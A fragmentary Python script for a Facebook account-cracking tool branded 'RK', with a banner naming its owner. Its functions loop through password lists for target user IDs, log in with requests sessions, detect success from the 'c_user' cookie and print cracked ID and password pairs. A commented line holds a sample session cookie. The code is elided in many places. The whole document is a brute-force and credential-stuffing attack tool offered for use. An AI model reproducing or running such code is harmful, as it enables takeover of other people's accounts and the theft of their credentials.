...
\033[1;32m════════════════════════════════════════════
\033[1;32m[+]     Owner    : Rk-404-
\033[1;32m[+]     Facebook : KAMAL HOSSAIN 
\033[1;32m[+]     Version  : Trail
\033[1;32m[+]     Git hub  : READ BULL
\033[1;32m[+]     Tol Typ  : Free
\033[1;32m════════════════════════════════════════════""")
def linex():
	print('\033[1;32m════════════════════════════════════════════')
loop = 0
...
def fia():    
			print(logo)
			print('\x1b[97;1m[✓] RK-➼  VERSION :\x1b[1;92m 1.0 ')
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[RK-➼] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[RK-➼-CP] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[RK-➼-OK] '+ids+' | '+pas+'\033[1;97m')
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[RK-➼] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[RK-➼-OK] %s | %s'%(ids,pas))
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mRK-➼\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
    ...
    # 'cookie': 'datr=wesNZX8WuDgCGLKqLopMG_u1; sb=wesNZdAfeEOo0q7tfqGjsjMw; m_pixel_ratio=1.5625; wd=461x939; fr=00VrdbbQuebBTzumB..BlDevB.s2.AAA.0.0.BlDevj.AWVPv_ox9zc',
    'dpr': '1.5625',
    ...
    'viewport-width': '980',}
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[RK-➼-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[RK-➼-OK] '+uid+' | '+ps+'\33[0;97m')
